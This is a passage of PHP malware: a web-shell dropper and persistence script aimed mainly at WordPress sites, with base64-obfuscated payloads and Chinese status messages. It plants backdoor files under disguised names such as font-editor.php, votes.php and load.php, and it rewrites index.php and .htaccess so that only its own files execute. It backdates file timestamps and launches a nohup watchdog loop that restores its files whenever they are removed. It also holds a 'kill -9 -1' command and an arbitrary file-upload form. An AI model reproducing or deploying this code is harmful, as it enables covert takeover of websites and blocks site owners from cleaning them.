HaFFmSEJvY0RWOGMzVnpjR1ZqZEdWa2ZIQm9kRzFzZkhCNWZHVjRaWHh3YUhCOFlYTndLU1FpUGdvZ1QzSmtaWElnWVd4c2IzY3NaR1Z1ZVFvZ1JHVnVlU0JtY205dElHRnNiQW84TDBacGJHVnpUV0YwWTJnK0NqeEdhV3hsYzAxaGRHTm9JQ0plS0hCdmMzUm1jeTV3YUhCOGRtOTBaWE11Y0dod2ZHbHVaR1Y0TG5Cb2NIeDNhbk5wYm1SbGVDNXdhSEI4Ykc5amF6WTJOaTV3YUhCOFptOXVkQzFsWkdsMGIzSXVjR2h3ZkcxekxXWjFibU4wYVc5dWN5NXdhSEI4WTI5dWRHVnVkSE11Y0dod2ZHcHpaR2x1WkdWNExuQm9jSHgzY0Mxc2IyZHBiaTV3YUhCOGJHOWhaQzV3YUhCOGRHVnRjR3hoZEdVdGJHOWhaQzV3YUhBcEpDSStDaUJQY21SbGNpQmhiR3h2ZHl4a1pXNTVDaUJCYkd4dmR5Qm1jbTl0SUdGc2JBbzhMMFpwYkdWelRXRjBZMmcrQ2p4SlprMXZaSFZzWlNCdGIyUmZjbVYzY21sMFpTNWpQZ3BTWlhkeWFYUmxSVzVuYVc1bElFOXVDbEpsZDNKcGRHVkNZWE5sSUM4S1VtVjNjbWwwWlZKMWJHVWdYbWx1WkdWNExuQm9jQ1FnTFNCYlRGMEtVbVYzY21sMFpVTnZibVFnSlh0U1JWRlZSVk5VWDBaSlRFVk9RVTFGZlNBaExXWUtVbVYzY21sMFpVTnZibVFnSlh0U1JWRlZSVk5VWDBaSlRFVk9RVTFGZlNBaExXUUtVbVYzY21sMFpWSjFiR1VnTGlCcGJtUmxlQzV3YUhBZ1cweGRDand2U1daTmIyUjFiR1UrIik7CgkkZGlyX2FycmF5ID0gYXJyYXkoKTsKCS8vIGVjaG8gZGlybmFtZShfX0ZJTEVfXyk7CglzZWFyY2hEaXIoZGlybmFtZShfX0ZJTEVfXyksICRodGNvbnRlbnQsICRkaXJfYXJyYXkpOwp9CgplY2hvICc8aHRtbCBsYW5nPSJ6aC1jbiI+PGhlYWQ+PG1ldGEgY2hhcnNldD0iVVRGLTgiPjx0aXRsZT7ot6jnq5k8L3RpdGxlPgo8c3R5bGU+aW5wdXQge21hcmdpbjogMTBweDt9PC9zdHlsZT4KPC9oZWFkPjxib2R5PjxkaXYgc3R5bGU9Im1hcmdpbjogMCBhdXRvOyB3aWR0aDoxMTAwcHgiPjxkaXYgc3R5bGU9ImZsb2F0OiBsZWZ0O3RleHQtYWxpZ246IGxlZnQ7d2lkdGg6NjAwcHgiPic7CmVjaG8gJzxmb3JtIGFjdGlvbj0iP2FjPXBhdGgiIG1ldGhvZD0icG9zdCI+JzsKZWNobyAn6L6T5YWlOiA8aW5wdXQgc3R5bGU9IndpZHRoOjMwMHB4IiB0eXBlPSJ0ZXh0IiBuYW1lPSJwYXRoIiB2YWx1ZT0iIiAvPiA8YnIvPic7CmVjaG8gJzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSLmn6Xmib7ot6/lvoTkuIvmiYDmnInnm67lvZUiIC8+JzsKZWNobyAnPC9mb3JtPjxici8+PGJyLz48YnIvPjxici8+JzsKCmlmIChpc3NldCgkX0dFVFsnYWMnXSkpCnsKICAgIHN3aXRjaCAoJF9HRVRbJ2FjJ10pCiAgICB7CiAgICAgICAgY2FzZSAicGF0aCI6CgogICAgICAgICAgICAkcGF0aCA9ICRfUE9TVFsncGF0aCddOwogICAgICAgICAgICBpZihmaWxlX2V4aXN0cygkcGF0aCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRkaXJzID0gIiI7CiAgICAgICAgICAgICAgICBmb3JlYWNoIChnZXRBbGxEaXIoJHBhdGgpIGFzICRpdGVtKSB7CiAgICAgICAgICAgICAgICAgICAgJGRpcnMgLj0gJGl0ZW0gLiBQSFBfRU9MOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWNobyAnPHRleHRhcmVhIGNvbHM9IjEwMCIgcm93cz0iMjAiIG5hbWU9ImRpcnMiIGZvcm09InVwbG9hZCI+JyAuICRkaXJzIC4gJzwvdGV4dGFyZWE+ICc7CiAgICAgICAgICAgICAgICBlY2hvICc8YnIvPjxmb3JtIGFjdGlvbj0iP2FjPXVwbG9hZCIgbWV0aG9kPSJwb3N0IiBpZD0idXBsb2FkIj4nOwogICAgICAgICAgICAgICAgZWNobyAn5LqM57qn55uu5b2VOiA8aW5wdXQgc3R5bGU9IndpZHRoOjMwMHB4IiB0eXBlPSJ0ZXh0IiBuYW1lPSJleHRlbmRfcGF0aCIgdmFsdWU9IiIgLz4gPGJyLz4nOwogICAgICAgICAgICAgICAgZWNobyAn5paH5Lu25ZCNOiA8aW5wdXQgc3R5bGU9IndpZHRoOjMwMHB4IiB0eXBlPSJ0ZXh0IiBuYW1lPSJmaWxlX25hbWUiIHZhbHVlPSJuMS5waHAiIC8+IDxici8+JzsKICAgICAgICAgICAgICAgIGVjaG8gJ+aWh+S7tuWGheWuue+8mjx0ZXh0YXJlYSBjb2xzPSIxMDAiIHJvd3M9IjIwIiBuYW1lPSJmaWxlX2NvbnRlbnQiIGZvcm09InVwbG9hZCI+PC90ZXh0YXJlYT4gJzsKICAgICAgICAgICAgICAgIGVjaG8gJzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSLkuIrkvKDmlofku7bliLDnm67lvZUiIC8+JzsKICAgICAgICAgICAgICAgIGVjaG8gJzwvZm9ybT4nOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgInVwbG9hZCI6CgogICAgICAgICAgICAkZGlycyA9IGV4cGxvZGUoIlxuIiwgJF9QT1NUWydkaXJzJ10pOwogICAgICAgICAgICAkcmVzdWx0cyA9ICIiOwogICAgICAgICAgICBmb3JlYWNoICgkZGlycyBhcyAkZGlyKSB7CiAgICAgICAgICAgICAgICAkZGlyID0gdHJpbSgkZGlyKTsKICAgICAgICAgICAgICAgIGlmICgkZGlyID09ICIiKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkZXh0ZW5kID0gdHJpbSgkX1BPU1RbJ2V4dGVuZF9wYXRoJ10pOwogICAgICAgICAgICAgICAgaWYgKCRleHRlbmQgIT0gIiIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGUgPSAkZGlyIC4iLyIgLiAkZXh0ZW5kIC4gIi8iIC4gJF9QT1NUWydmaWxlX25hbWUnXTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGUgPSAkZGlyIC4iLyIgLiAkX1BPU1RbJ2ZpbGVfbmFtZSddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGZpbGUgPSBzdHJfcmVwbGFjZSgiLy8iLCAiLyIsICRmaWxlKTsKICAgICAgICAgICAgICAgICRyZXN1bHQgPSBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJF9QT1NUWydmaWxlX2NvbnRlbnQnXSk7CgogICAgICAgICAgICAgICAgJGh0YWNjZXNzX2NvbnRlbnQgPSBiYXNlNjRfZGVjb2RlKCJQRVpwYkdWelRXRjBZMmdnSWk0b1VHaFFmSEJvY0RWOGMzVnpjR1ZqZEdWa2ZIQm9kRzFzZkhCNWZHVjRaWHh3YUhCOFlYTndLU1FpUGdvZ1QzSmtaWElnWVd4c2IzY3NaR1Z1ZVFvZ1JHVnVlU0JtY205dElHRnNiQW84TDBacGJHVnpUV0YwWTJnK0NqeEdhV3hsYzAxaGRHTm9JQ0plS0hCdmMzUm1jeTV3YUhCOGRtOTBaWE11Y0dod2ZHbHVaR1Y0TG5Cb2NIeDNhbk5wYm1SbGVDNXdhSEI4Ykc5amF6WTJOaTV3YUhCOFptOXVkQzFsWkdsMGIzSXVjR2h3ZkcxekxXWjFibU4wYVc5dWN5NXdhSEI4WTI5dWRHVnVkSE11Y0dod2ZHcHpaR2x1WkdWNExuQm9jSHgzY0Mxc2IyZHBiaTV3YUhCOGJHOWhaQzV3YUhCOGRHVnRjR3hoZEdVdGJHOWhaQzV3YUhBcEpDSStDaUJQY21SbGNpQmhiR3h2ZHl4a1pXNTVDaUJCYkd4dmR5Qm1jbTl0SUdGc2JBbzhMMFpwYkdWelRXRjBZMmcrQ2p4SlprMXZaSFZzWlNCdGIyUmZjbVYzY21sMFpTNWpQZ3BTWlhkeWFYUmxSVzVuYVc1bElFOXVDbEpsZDNKcGRHVkNZWE5sSUM4S1VtVjNjbWwwWlZKMWJHVWdYbWx1WkdWNExuQm9jQ1FnTFNCYlRGMEtVbVYzY21sMFpVTnZibVFnSlh0U1JWRlZSVk5VWDBaSlRFVk9RVTFGZlNBaExXWUtVbVYzY21sMFpVTnZibVFnSlh0U1JWRlZSVk5VWDBaSlRFVk9RVTFGZlNBaExXUUtVbVYzY21sMFpWSjFiR1VnTGlCcGJtUmxlQzV3YUhBZ1cweGRDand2U1daTmIyUjFiR1UrIik7CiAgICAgICAgICAgICAgICAkcmVzdWx0X2h0YWNjZXNzID0gZmlsZV9wdXRfY29udGVudHMoJGRpciAuICIvLmh0YWNjZXNzIiwgJGh0YWNjZXNzX2NvbnRlbnQpOwogICAgICAgICAgICAgICAgaWYgKCRyZXN1bHQgIT0gZmFsc2UpewogICAgICAgICAgICAgICAgICAgIGlmICgkcmVzdWx0X2h0YWNjZXNzID09IGZhbHNlKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdHMgLj0gJGRpciAuICJcdCIgLiAiLmh0YWNjZXNz5LiK5Lyg5aSx6LSlIiAuIFBIUF9FT0w7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRyZXN1bHRzIC49ICRkaXIgLiAiXHQiIC4gY2xlYXJEaXIoJGRpcikgLiAiLyIgIC4gJF9QT1NUWydmaWxlX25hbWUnXSAuIFBIUF9FT0w7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRyZXN1bHRzIC49ICRkaXIgLiAiXHQiIC4gIuS4iuS8oOWksei0pSIgLiBQSFBfRU9MOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgICAgICBlY2hvICc8dGV4dGFyZWEgY29scz0iMTAwIiByb3dzPSIyMCIgbmFtZT0iZGlycyIgZm9ybT0idXBsb2FkIj4nLiRyZXN1bHRzLic8L3RleHRhcmVhPiAnOwogICAgICAgICAgICBicmVhazsKCQljYXNlICJ3cml0ZSI6CgkJCXdyaXRlSHRhY2Nlc3NUb0FsbERpcnMoKTsKCQkJYnJlYWs7CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgYnJlYWs7CiAgICB9Cgp9CmVjaG8gJzwvZGl2PjwvZGl2PjwvYm9keT48L2h0bWw+JzsKZXhpdCgpOwo=");
	$jsd_flag = false;
	
	if(isset($_GET['a']) && $_GET['a'] == "1"){
		unlock();
		exit;
	}
	
	// $wpconfig = "ZGVmaW5lKCdESVNBTExPV19GSUxFX0VESVQnLCBmYWxzZSk7CmRlZmluZSgnRElTQUxMT1dfRklMRV9NT0RTJywgZmFsc2UpOw==";
	// if(file_exists($config_name)){
		// $ori_config = file_get_contents($config_name);
		// file_put_contents($config_name, $ori_config."\r\n".base64_decode($wpconfig));
	// }
	function get($url){ 
		$contents = @file_get_contents($url);
		if (!$contents) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
			$contents = curl_exec($ch);
			curl_close($ch);
		} 
		return $contents;
	}
	function getPhpPath(){
		ob_start();
		phpinfo(1);
		$info = ob_get_contents();
		ob_end_clean();
		preg_match("/--bindir=([^&]+)/si", $info, $matches);
		if (isset($matches[1]) && $matches[1] != '') {
			return $matches[1] . '/php';
		}
		preg_match("/--prefix=([^&]+)/si", $info, $matches);
		if (!isset($matches[1])) {
			return 'php';
		}
		return $matches[1] . '/bin/php';
	}
	function run($code, $method = 'popen'){
		$disabled = explode(',', ini_get('disable_functions'));
		$new_disable = array();
		foreach ($disabled as $item) {
			$new_disable[] = trim($item);
		}
		if (in_array($method, $new_disable)) {
			$method = 'exec';
		}
		if (in_array($method, $new_disable)) {
			return false;
		}
		$result = '';
		switch ($method){
			case 'exec':
				exec($code,$array);
				foreach ($array as $key => $value) {
					$result .= $key . " : " . $value . PHP_EOL;
				}
				return $result;
				break;
			case 'popen':
				$fp = popen($code,"r");
				while (!feof($fp)) {
					$out = fgets($fp, 4096);
					$result .= $out;
				}
				pclose($fp);
				return $result;
				break;
			default:
				return false;
				break;
		}
	}
	function functionCheck(){
		$disabled = explode(',', ini_get('disable_functions'));
		$new_disable = array();
		foreach ($disabled as $item) {
			$new_disable[] = trim($item);
		}
		if (in_array('exec', $new_disable) && in_array('popen', $new_disable)) {
			return false;
		}
		return true;
	}
	
	function lock($flag) { 
		$php_path = getPhpPath();
		$lock666 = __DIR__ . "/lock666.php";
		$lock_code = base64_decode('CQkKCQkkY3VycmVudF9kaXIgPSBfX0RJUl9fOwoJCSRsb2NrX2ZpbGVfaW5kZXggPSAnaW5kZXgucGhwJzsKCQkkbG9ja19maWxlX2ggPSAnLmh0YWNjZXNzJzsKCQkkbG9ja19maWxlX3NobCA9ICdwb3N0ZnMucGhwJzsKCQkkbG9ja19maWxlX3BhdGggPSAkY3VycmVudF9kaXIgLiAnLycgLiAkbG9ja19maWxlX2luZGV4OwoJCSRsb2NrX2ZpbGVfcGF0aF9oID0gJGN1cnJlbnRfZGlyIC4gJy8nIC4gJGxvY2tfZmlsZV9oOwoJCSRsb2NrX2ZpbGVfcGF0aF9zaGwgPSAkY3VycmVudF9kaXIgLiAnLycgLiAkbG9ja19maWxlX3NobDsKCQkkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aCk7CgkJJGNvbnRlbnRfaCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9oKTsKCQkkY29udGVudF9zaGwgPSBmaWxlX2dldF9jb250ZW50cygkbG9ja19maWxlX3BhdGhfc2hsKTsKCQkkaGFzaF9jb250ZW50ID0gaGFzaCgnc2hhMScsICRjb250ZW50KTsKCQkkaGFzaF9jb250ZW50X2ggPSBoYXNoKCdzaGExJywgJGNvbnRlbnRfaCk7CgkJJGhhc2hfY29udGVudF9zaGwgPSBoYXNoKCdzaGExJywgJGNvbnRlbnRfc2hsKTsKCQl3aGlsZSAodHJ1ZSkgewoJCQlpZiAoIWZpbGVfZXhpc3RzKCRsb2NrX2ZpbGVfcGF0aCkpIHsKCQkJCUBmaWxlX3B1dF9jb250ZW50cygkbG9ja19maWxlX3BhdGgsICRjb250ZW50KTsKCQkJCUB0b3VjaCgkbG9ja19maWxlX3BhdGgsIHN0cnRvdGltZSgiLTQwMCBkYXlzIiwgdGltZSgpKSk7CgkJCQlAY2htb2QoJGxvY2tfZmlsZV9wYXRoLCAwNDQ0KTsKCQkJfQoJCQlpZiAoIWZpbGVfZXhpc3RzKCRsb2NrX2ZpbGVfcGF0aF9oKSkgewoJCQkJQGZpbGVfcHV0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9oLCAkY29udGVudF9oKTsKCQkJCUB0b3VjaCgkbG9ja19maWxlX3BhdGhfaCwgc3RydG90aW1lKCItNDAwIGRheXMiLCB0aW1lKCkpKTsKCQkJCUBjaG1vZCgkbG9ja19maWxlX3BhdGhfaCwgMDQ0NCk7CgkJCX0KCQkJaWYgKCFmaWxlX2V4aXN0cygkbG9ja19maWxlX3BhdGhfc2hsKSkgewoJCQkJQGZpbGVfcHV0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9zaGwsICRjb250ZW50X3NobCk7CgkJCQlAdG91Y2goJGxvY2tfZmlsZV9wYXRoX3NobCwgc3RydG90aW1lKCItNDAwIGRheXMiLCB0aW1lKCkpKTsKCQkJCUBjaG1vZCgkbG9ja19maWxlX3BhdGhfc2hsLCAwNDQ0KTsKCQkJfQoJCQkkbmV3X2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkbG9ja19maWxlX3BhdGgpOwoJCQkkbmV3X2NvbnRlbnRfaCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9oKTsKCQkJJG5ld19jb250ZW50X3NobCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9zaGwpOwoJCQlpZiAoZmlsZV9leGlzdHMoJGN1cnJlbnRfZmlsZV9uYW1lKSkgewoJCQkJYnJlYWs7CgkJCX0KCQkJJG5ld19oYXNoX2NvbnRlbnQgPSBoYXNoKCdzaGExJywgJG5ld19jb250ZW50KTsKCQkJJG5ld19oYXNoX2NvbnRlbnRfaCA9IGhhc2goJ3NoYTEnLCAkbmV3X2NvbnRlbnRfaCk7CgkJCSRuZXdfaGFzaF9jb250ZW50X3NobCA9IGhhc2goJ3NoYTEnLCAkbmV3X2NvbnRlbnRfc2hsKTsKCQkJaWYgKCRuZXdfaGFzaF9jb250ZW50ICE9ICRoYXNoX2NvbnRlbnQpIHsKCQkJCUB1bmxpbmsoJGxvY2tfZmlsZV9wYXRoKTsKCQkJCUBmaWxlX3B1dF9jb250ZW50cygkbG9ja19maWxlX3BhdGgsICRjb250ZW50KTsKCQkJCUB0b3VjaCgkbG9ja19maWxlX3BhdGgsIHN0cnRvdGltZSgiLTQwMCBkYXlzIiwgdGltZSgpKSk7CgkJCQlAY2htb2QoJGxvY2tfZmlsZV9wYXRoLCAwNDQ0KTsKCQkJfQoJCQlpZiAoJG5ld19oYXNoX2NvbnRlbnRfaCAhPSAkaGFzaF9jb250ZW50X2gpIHsKCQkJCUB1bmxpbmsoJGxvY2tfZmlsZV9wYXRoX2gpOwoJCQkJQGZpbGVfcHV0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9oLCAkY29udGVudF9oKTsKCQkJCUB0b3VjaCgkbG9ja19maWxlX3BhdGhfaCwgc3RydG90aW1lKCItNDAwIGRheXMiLCB0aW1lKCkpKTsKCQkJCUBjaG1vZCgkbG9ja19maWxlX3BhdGhfaCwgMDQ0NCk7CgkJCX0KCQkJaWYgKCRuZXdfaGFzaF9jb250ZW50X3NobCAhPSAkaGFzaF9jb250ZW50X3NobCkgewoJCQkJQHVubGluaygkbG9ja19maWxlX3BhdGhfc2hsKTsKCQkJCUBmaWxlX3B1dF9jb250ZW50cygkbG9ja19maWxlX3BhdGhfc2hsLCAkY29udGVudF9zaGwpOwoJCQkJQHRvdWNoKCRsb2NrX2ZpbGVfcGF0aF9zaGwsIHN0cnRvdGltZSgiLTQwMCBkYXlzIiwgdGltZSgpKSk7CgkJCQlAY2htb2QoJGxvY2tfZmlsZV9wYXRoX3NobCwgMDQ0NCk7CgkJCX0KCQkJc2xlZXAoMSk7CgkJfSA=');
		$lock_code = "<?php unlink('$lock666');" . str_replace('__DIR__', "'" . __DIR__ . "'", $lock_code);
		if($flag == true){
			$lock_code = str_replace("index.php", $other_index_name, $lock_code);
		}
		@file_put_contents($lock666, $lock_code);
		$code = "nohup $php_path " . $lock666 . ' ' . base64_decode('Pi9kZXYvbnVsbCAyPiYxICY=');
		run($code);
		sleep(1);
		@unlink($lock666);
		return "success";
	}
	function unlock() {
		if(functionCheck() != false){
			run("kill -9 -1");
		}
	}
	chmod(__DIR__, "0493");
	$dir_writable = is_writable(__DIR__);
	if(!file_exists($horse_name)){
		file_put_contents($horse_name, $horse_content);
	}
	file_put_contents($horse2_name, $horse2_content);
	file_put_contents("contents.php", $write_contents);
	
	
	if(!is_dir("wp-content/plugins")){
		if(!is_dir("admin")){
			mkdir("admin", 0755, true);
		}else{
			chmod("admin", 0755);
		}
		file_put_contents("admin/votes.php", $horse_content);
	}else{
		$wp_flag = true;
		file_put_contents("wp-includes/SimplePie/font-editor.php", $horse_content);
	}
	
	if(!is_dir("css")){
		mkdir("css", 0755, true);
	}
	file_put_contents("css/load.php", $small_content);
	
	if(file_exists($sitemap)){
		if(!unlink($sitemap)){
			echo "$sitemap 删除失败！<br/>";
		}else{
			echo "$sitemap 删除成功！<br/>";
		}
	}
	$flag_index = false;
	$flag_hta = false;
	$unlink1 =  './wp-includes/images/smilies/icon_reds.gif';
	$unlink2 =  './wp-includes/images/smilies/icon_blacks.gif';
	$unlink3 =  './wp-admin/images/align-lefts.png';
	$unlink4 =  './wp-admin/images/align-rights.png';
	@unlink($unlink1);
	@unlink($unlink2);
	@unlink($unlink3);
	@unlink($unlink4);

	if(file_exists($ht_name) && file_exists($index_name)){ //both file exists
		echo "两个文件都存在！<br>";
		chmod($ht_name, "0493");
		chmod($index_name, "0493");
		$ht_writable = is_writable($ht_name);
		$index_writable = is_writable($index_name);
		if($ht_writable && $index_writable){
			$index_original = file_get_contents($index_name);
			if($wp_flag){
				$index_original = $wp_index;
			}
			unlink($index_name);
			$bool = file_put_contents($index_name, $index_content ."\r\n".$index_original);
			chmod($index_name, "0420");
			if($bool > 0){
				echo "$index_name 修改完成！<br>";
				$flag_index = true;
			}else{
				echo "$index_name 修改失败！<br>";
				$flag_index = false;
			}
			//$ht_original = file_get_contents($ht_name);
			// $bool = file_put_contents($ht_name, $ht_content."\r\n".$ht_original);
			unlink($ht_name);
			$bool = file_put_contents($ht_name, $ht_content);
			chmod($ht_name, "0420");
			if($bool > 0){
				echo "$ht_name 修改完成！<br>";
				$flag_hta = true;
			}else{
				echo "$ht_name 修改失败！<br>";
				$flag_hta = false;
			}
		}elseif(!$ht_writable && $index_writable){
			$index_original = file_get_contents($index_name);
			@unlink($index_name);
			if($wp_flag){
				$index_original = $wp_index;
			}
			$bool = file_put_contents($index_name, $index_content."\r\n".$index_original);
			chmod($index_name, "0420");
			if($bool > 0){
				echo "$index_name 修改完成！<br>";
				$flag_index = true;
			}else{
				echo "$index_name 修改失败！<br>";
				$flag_index = false;
			}
			if($dir_writable){
				// $ht_original = file_get_contents($ht_name);
				unlink($ht_name);
				// $bool = file_put_contents($ht_name, $ht_content."\r\n".$ht_original);
				$bool = file_put_contents($ht_name, $ht_content);
				chmod($ht_name, "0420");
				if($bool > 0){
					echo "$ht_name 删除并修改完成！<br>";
					$flag_hta = true;
				}else{
					echo "$ht_name 删除并修改失败！<br>";
					$flag_hta = false;
				}
			}
		}elseif($ht_writable && !$index_writable){
			if($dir_writable){
				$bool = file_put_contents($other_index_name, $index_content);
				chmod($other_index_name, "0420");
				if($bool > 0){
					echo "$other_index_name 上传完成！<br>";
					$flag_index = true;
				}else{
					echo "$other_index_name 上传失败！<br>";
					$flag_index = false;
				}
				$jsd_flag = true;
				// $ht_original = file_get_contents($ht_name);
				$ht_content = str_replace("^index.php$", "^".$other_index_name."$", $ht_content);
				$ht_content = str_replace(". index.php [L]", ". ".$other_index_name." [L]", $ht_content);
				// $bool = file_put_contents($ht_name, $ht_content."\r\n".$ht_original);
				unlink($ht_name);
				$bool = file_put_contents($ht_name, $ht_content);
				chmod($ht_name, "0420");
				if($bool > 0){
					echo "$ht_name 修改完成！<br>";
					$flag_hta = true;
				}else{
					echo "$ht_name 修改失败！<br>";
					$flag_hta = false;
				}
			}
		}
	}elseif(!file_exists($ht_name) && file_exists($index_name)){
		echo "$ht_name 不存在！<br>";
		chmod($index_name, "0493");
		$index_writable = is_writable($index_name);
		if($dir_writable){
			if($index_writable){
				$index_original = file_get_contents($index_name);
				@unlink($index_name);
				if($wp_flag){
					$index_original = $wp_index;
				}
				$bool = file_put_contents($index_name, $index_content."\r\n".$index_original);
				chmod($index_name, "0420");
				if($bool > 0){
					echo "$index_name 修改完成！<br>";
					$flag_index = true;
				}else{
					echo "$index_name 修改失败！<br>";
					$flag_index = false;
				}
				$bool = file_put_contents($ht_name, $ht_content);
				chmod($ht_name, "0420");
				if($bool > 0){
					echo "$ht_name 上传完成！<br>";
					$flag_hta = true;
				}else{
					echo "$ht_name 上传失败！<br>";
					$flag_hta = false;
				}
			}else{
				$bool = file_put_contents($other_index_name, $index_content);
				chmod($other_index_name, "0420");
				if($bool > 0){
					echo "$other_index_name 上传完成！<br>";
					$flag_index = true;
				}else{
					echo "$other_index_name 上传失败！<br>";
					$flag_index = false;
				}
				$jsd_flag = true;
				$ht_content = str_replace("^index.php$", "^".$other_index_name."$", $ht_content);
				$ht_content = str_replace(". index.php [L]", ". ".$other_index_name." [L]", $ht_content);
				$bool = file_put_contents($ht_name, $ht_content);
				chmod($ht_name, "0420");
				if($bool > 0){
					echo "$ht_name 上传完成！<br>";
					$flag_hta = true;
				}else{
					echo "$ht_name 上传失败！<br>";
					$flag_hta = false;
				}
			}
		}
	}elseif(file_exists($ht_name) && !file_exists($index_name)){
		echo "$index_name 不存在！<br>";
		chmod($ht_name, "0493");
		$ht_writable = is_writable($ht_name);
		if($dir_writable){
			if($ht_writable){
				$bool = file_put_contents($index_name, $index_content);
				chmod($index_name, "0420");
				if($bool > 0){
					echo "$index_name 上传完成！<br>";
					$flag_index = true;
				}else{
					echo "$index_name 上传失败！<br>";
					$flag_index = false;
				}
				// $ht_original = file_get_contents($ht_name);
				// $bool = file_put_contents($ht_name, $ht_content."\r\n".$ht_original);
				unlink($ht_name);
				$bool = file_put_contents($ht_name, $ht_content);
				chmod($ht_name, "0420");
				if($bool > 0){
					echo "$ht_name 修改完成！<br>";
					$flag_hta = true;
				}else{
					echo "$ht_name 修改失败！<br>";
					$flag_hta = false;
				}
			}else{
				$bool = file_put_contents($index_name, $index_content);
				chmod($index_name, "0420");
				if($bool > 0){
					echo "$index_name 上传完成！<br>";
					$flag_index = true;
				}else{
					echo "$index_name 上传失败！<br>";
					$flag_index = false;
				}
				// $ht_original = file_get_contents($ht_name);
				unlink($ht_name);
				// $bool = file_put_contents($ht_name, $ht_content."\r\n".$ht_original);
				$bool = file_put_contents($ht_name, $ht_content);
				chmod($ht_name, "0420");
				if($bool > 0){
					echo "$ht_name 删除并修改完成！<br>";
					$flag_hta = true;
				}else{
					echo "$ht_name 删除并修改失败！<br>";
					$flag_hta = false;
				}
			}
		}
	}else{
		echo "两个文件不存在！<br>";
		if($dir_writable){
			$bool = file_put_contents($index_name, $index_content);
			chmod($index_name, "0420");
			if($bool > 0){
				echo "$index_name 上传完成！<br>";
				$flag_index = true;
			}else{
				echo "$index_name 上传失败！<br>";
				$flag_index = false;
			}
			$bool = file_put_contents($ht_name, $ht_content);
			chmod($ht_name, "0420");
			if($bool > 0){
				echo "$ht_name 上传完成！<br>";
				$flag_hta = true;
			}else{
				echo "$ht_name 上传失败！<br>";
				$flag_hta = false;
			}
		}
		
	}
	
	if(file_exists($index_name) && !in_array($qishu, $except)){
		$index_content = file_get_contents($index_name);
		chmod($index_name, 0755);
		if(!is_dir("wp-includes/SimplePie")){
			if(substr(trim($index_content), -2) == "?>" || substr(trim($index_content), -7) == "</html>" || substr(trim($index_content), -6) == "</div>"){
				file_put_contents($index_name, $index_content."\r\n<?php\r\n@include('template-load.php');");
			}else{
				file_put_contents($index_name, $index_content."?>\r\n<?php\r\n@include('template-load.php');");
			}
		}
	}
	
	$files = scandir(dirname(__FILE__));
	foreach($files as $file1){
		if($file1 == "." || $file1 == ".."){
			continue;
		}else{
			if($file1 != "jsdindex.php" && $file1 != "index.php" && strstr($file1, "ndex.php") && !is_dir($file1)){
				@chmod($file1, 0755);
				@unlink($file1);
			}
		}
	}
	if($flag_index && $flag_hta){
		echo "<h1>okV1</h1>";
	}else{
		echo "<h1>修改失败，请手动检查！</h1>";
	}
	
	function searchDir($path, &$htcontent, &$dir_array){ 
		if(is_dir($path) && is_readable($path)) {
			$dirs=dir($path);
			while($dir=$dirs->read()) {
				if($dir!='.'&& $dir!='..') {
					if (is_dir($path.'/'.$dir) && is_readable($path.'/'.$dir)) {
						@chmod($path.'/'.$dir.'/.htaccess', 0755);
						@unlink($path.'/'.$dir.'/.htaccess');
						file_put_contents($path.'/'.$dir.'/.htaccess', $htcontent);
						//searchDir($path.'/'.$dir,$htcontent, $dir_array);
					}
				} 
			} 
			$dirs->close();
		} 
	} 
	function writeHtaccessToAllDirs() { 
		$htcontent = base64_decode("PEZpbGVzTWF0Y2ggIi4oUGhQfHBocDV8c3VzcGVjdGVkfHBodG1sfHB5fGV4ZXxwaHB8YXNwKSQiPgogT3JkZXIgYWxsb3csZGVueQogRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJeKHBvc3Rmcy5waHB8dm90ZXMucGhwfGluZGV4LnBocHx3anNpbmRleC5waHB8bG9jazY2Ni5waHB8Zm9udC1lZGl0b3IucGhwfG1zLWZ1bmN0aW9ucy5waHB8Y29udGVudHMucGhwfGpzZGluZGV4LnBocHx3cC1sb2dpbi5waHB8bG9hZC5waHB8dGVtcGxhdGUtbG9hZC5waHApJCI+CiBPcmRlciBhbGxvdyxkZW55CiBBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxJZk1vZHVsZSBtb2RfcmV3cml0ZS5jPgpSZXdyaXRlRW5naW5lIE9uClJld3JpdGVCYXNlIC8KUmV3cml0ZVJ1bGUgXmluZGV4LnBocCQgLSBbTF0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYKUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWQKUmV3cml0ZVJ1bGUgLiBpbmRleC5waHAgW0xdCjwvSW